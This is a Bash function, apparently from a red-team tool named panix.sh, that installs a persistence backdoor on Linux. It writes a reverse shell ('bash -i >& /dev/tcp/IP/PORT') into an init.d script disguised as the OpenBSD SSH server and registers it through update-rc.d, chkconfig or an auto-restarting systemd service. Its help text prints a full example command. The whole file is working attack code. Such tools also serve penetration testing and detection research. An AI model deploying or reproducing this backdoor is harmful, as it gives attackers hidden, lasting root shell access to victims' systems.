setup_initd_backdoor() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local command=""
	local initd_path="/etc/init.d/ssh-procps"

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_initd_backdoor() {
		echo "Usage: ./panix.sh --initd-backdoor [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default init.d settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom init.d settings"
		echo "  --command <command>          Specify custom command"
		echo "  --path <path>                Specify custom /etc/init.d/ file path"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--command )
				shift
				command=$1
				;;
			--path )
				shift
				initd_path=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --initd --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --initd --custom --command \"nohup setsid bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --path \"/etc/init.d/initd-backdoor\""
				exit 0
				;;
			--help|-h)
				usage_initd_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --initd: $1"
				echo "Try './panix.sh --initd --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --initd --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --initd --help' for more information."
		exit 1
	fi

	create_initd_script() {
		local payload=$1
		mkdir -p /etc/init.d
		cat <<-EOF > $initd_path
		#! /bin/sh
		### BEGIN INIT INFO
		# Provides:             ssh sshd
		# Required-Start:       \$remote_fs \$syslog \$network
		# Required-Stop:        \$remote_fs \$syslog
		# Default-Start:        2 3 4 5
		# Default-Stop:        
		# Short-Description:    OpenBSD Secure Shell server
		### END INIT INFO

		$payload
		EOF
		chmod +x $initd_path
	}

	establish_persistence() {
		if sudo which update-rc.d >/dev/null 2>&1; then
			sudo update-rc.d $(basename $initd_path) defaults
		elif sudo which chkconfig >/dev/null 2>&1; then
			sudo chkconfig --add $(basename $initd_path)
			sudo chkconfig $(basename $initd_path) on
		elif sudo which systemctl >/dev/null 2>&1; then
			# Create systemd service
			local service_name=$(basename $initd_path)
			local service_path="/etc/systemd/system/${service_name}.service"
			cat <<-EOF > $service_path
			[Unit]
			Description=Custom Init Script
			After=network.target

			[Service]
			Type=simple
			ExecStart=$initd_path start
			ExecStop=$initd_path stop
			ExecReload=$initd_path reload
			Restart=always
			RestartSec=5
			TimeoutStopSec=30
			TimeoutStartSec=30

			[Install]
			WantedBy=multi-user.target
			EOF
			sudo systemctl daemon-reload
			sudo systemctl enable $service_name
			sudo systemctl start $service_name &
		elif sudo which service >/dev/null 2>&1; then
			# Using service to start the script directly
			sudo service $(basename $initd_path) start
		else
			echo "Error: No suitable method found to establish persistence."
			exit 1
		fi
	}

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --initd --help' for more information."
			exit 1
		fi

		local payload="nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
		if [[ ! -f $initd_path ]]; then
			create_initd_script "$payload"
		else
			echo "$payload" >> $initd_path
		fi
		establish_persistence
		echo "[+] init.d backdoor established!"

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command || -z $initd_path ]]; then
			echo "Error: --command and --path must be specified when using --custom."
			echo "Try './panix.sh --initd --help' for more information."
			exit 1
		fi

		if [[ ! -f $initd_path ]]; then
			create_initd_script "$command"
		else
			echo "$command" >> $initd_path
		fi
		establish_persistence
		echo "[+] init.d backdoor established"
	fi
}
